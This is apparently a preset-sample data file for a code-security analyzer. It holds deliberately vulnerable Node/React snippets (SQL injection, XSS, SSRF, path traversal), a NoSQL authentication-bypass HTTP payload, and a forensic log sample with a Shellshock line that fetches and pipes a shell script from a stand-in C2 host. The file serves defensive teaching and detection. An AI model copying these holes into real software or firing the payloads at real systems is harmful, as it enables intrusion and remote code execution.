import { PresetSample } from '../types/security';

export const PRESET_SAMPLES: PresetSample[] = [
  {
    id: 'sql-injection-node',
    title: 'SQL Injection via String Concatenation',
    category: 'OWASP A03: Injection',
    inputType: 'code',
    targetEnvironment: 'Node.js / Express / PostgreSQL',
    description: 'Vulnerable login endpoint with direct SQL query interpolation allowing authentication bypass.',
    badge: 'SQLi',
    code: `// Express.js Authentication Controller
app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;

  // VULNERABLE: Direct string interpolation into raw SQL query
  const query = "SELECT id, username, role FROM users WHERE username = '" + 
                username + "' AND password = '" + password + "'";

  try {
    const result = await db.query(query);
    if (result.rows.length > 0) {
      return res.json({ token: generateToken(result.rows[0]), user: result.rows[0] });
    }
    return res.status(401).json({ error: 'Invalid credentials' });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});`,
  },
  {
    id: 'xss-react-dom',
    title: 'Cross-Site Scripting (Reflected & DOM XSS)',
    category: 'OWASP A03: Injection',
    inputType: 'code',
    targetEnvironment: 'React / Next.js',
    description: 'Rendering unescaped user query parameter directly into the DOM using dangerouslySetInnerHTML.',
    badge: 'XSS',
    code: `import { useSearchParams } from 'next/navigation';

export function SearchResultsPage() {
  const searchParams = useSearchParams();
  const query = searchParams.get('q') || '';

  return (
    <div className="search-container">
      <h2>Search Results</h2>
      {/* VULNERABLE: Direct rendering of unsanitized URL parameter */}
      <div 
        className="query-highlight"
        dangerouslySetInnerHTML={{ 
          __html: \`<p>Showing matches for query: <b>\${query}</b></p>\` 
        }} 
      />
      <div id="results">...</div>
    </div>
  );
}`,
  },
  {
    id: 'ssrf-image-fetcher',
    title: 'Server-Side Request Forgery (SSRF)',
    category: 'OWASP A10: SSRF',
    inputType: 'code',
    targetEnvironment: 'Next.js App Router / Node.js API',
    description: 'Unrestricted remote image proxying allowing access to cloud metadata services (169.254.169.254) and internal VPC services.',
    badge: 'SSRF',
    code: `// Next.js API Route /api/fetch-avatar
import axios from 'axios';

export async function POST(request: Request) {
  const body = await request.json();
  const avatarUrl = body.avatarUrl;

  // VULNERABLE: Blind HTTP request without URL scheme, IP or DNS host allowlisting
  try {
    const response = await axios.get(avatarUrl, {
      responseType: 'arraybuffer',
      timeout: 5000,
    });
    
    return new Response(response.data, {
      headers: { 'Content-Type': response.headers['content-type'] },
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: 'Failed to retrieve image' }), {
      status: 502,
    });
  }
}`,
  },
  {
    id: 'nosql-http-payload',
    title: 'HTTP Payload: NoSQL Authentication Bypass',
    category: 'OWASP A03: Injection',
    inputType: 'http',
    targetEnvironment: 'HTTP API / Express + Mongoose',
    description: 'Raw HTTP POST payload submitting MongoDB query operator objects instead of strings.',
    badge: 'HTTP Payload',
    code: `POST /api/v2/users/authenticate HTTP/1.1
Host: api.staging.target-corp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/json
Accept: application/json
Content-Length: 76

{
  "username": { "$ne": null },
  "password": { "$gt": "" },
  "rememberMe": true
}`,
  },
  {
    id: 'path-traversal-node',
    title: 'Path Traversal & Arbitrary File Read',
    category: 'OWASP A01: Broken Access Control',
    inputType: 'code',
    targetEnvironment: 'Node.js / Express',
    description: 'Unsanitized user-supplied filename combined with path.join leading to ../../etc/passwd leaks.',
    badge: 'Path Traversal',
    code: `import express from 'express';
import fs from 'fs';
import path from 'path';

const app = express();

app.get('/download', (req, res) => {
  const fileName = req.query.file as string;

  // VULNERABLE: path.join resolves relative dot-dot-slash components
  const targetFile = path.join(__dirname, 'public/documents', fileName);

  fs.readFile(targetFile, 'utf8', (err, data) => {
    if (err) {
      return res.status(404).send('Document not found');
    }
    res.setHeader('Content-Type', 'text/plain');
    res.send(data);
  });
});`,
  },
  {
    id: 'access-log-audit',
    title: 'Access Log Forensic Analysis',
    category: 'Log Forensics & Attack Signatures',
    inputType: 'log',
    targetEnvironment: 'Nginx / Apache Web Server Access Log',
    description: 'Suspicious HTTP requests containing directory traversal, SQL union probes, and automated scanner flags.',
    badge: 'Server Logs',
    code: `198.51.100.42 - - [11/Oct/2026:14:22:01 +0000] "GET /products.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1" 200 4521 "https://victim.com/" "sqlmap/1.6.12#stable"
203.0.113.19 - - [11/Oct/2026:14:22:15 +0000] "GET /api/v1/download?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1832 "-" "curl/7.88.1"
198.51.100.42 - - [11/Oct/2026:14:22:49 +0000] "POST /cgi-bin/test-cgi HTTP/1.1" 404 162 "-" "Mozilla/5.0 () { :;}; /bin/bash -c 'wget http://malicious-c2.com/shell.sh -O- | sh'"
192.168.1.105 - - [11/Oct/2026:14:23:02 +0000] "GET /admin/dashboard HTTP/1.1" 302 0 "https://victim.com/login" "Mozilla/5.0"`,
  },
  {
    id: 'safe-code-baseline',
    title: 'Clean Baseline (Secure Parameterized React + Zod)',
    category: 'Hardened Production Baseline',
    inputType: 'code',
    targetEnvironment: 'React + Node.js (Zod & Parameterized SQL)',
    description: 'Demonstrates a properly fortified implementation with input schema validation, type safety, and parameterized queries.',
    badge: 'Safe Baseline',
    code: `import { z } from 'zod';
import { Pool } from 'pg';

const pool = new Pool();

// 1. Strict input validation schema
const loginSchema = z.object({
  username: z.string().min(3).max(50).regex(/^[a-zA-Z0-9_.-]+$/),
  password: z.string().min(8).max(128),
});

export async function handleLogin(reqBody: unknown) {
  // 2. Parse and reject malicious payloads early
  const parsed = loginSchema.safeParse(reqBody);
  if (!parsed.success) {
    throw new Error('Invalid input format');
  }

  const { username, password } = parsed.data;

  // 3. Parameterized query (prevents SQL Injection)
  const query = 'SELECT id, username, password_hash, role FROM users WHERE username = $1 LIMIT 1';
  const result = await pool.query(query, [username]);

  if (result.rows.length === 0) {
    return { success: false, message: 'Invalid credentials' };
  }

  const user = result.rows[0];
  const isValid = await verifyPassword(password, user.password_hash);
  if (!isValid) {
    return { success: false, message: 'Invalid credentials' };
  }

  return { success: true, userId: user.id, role: user.role };
}`,
  },
];
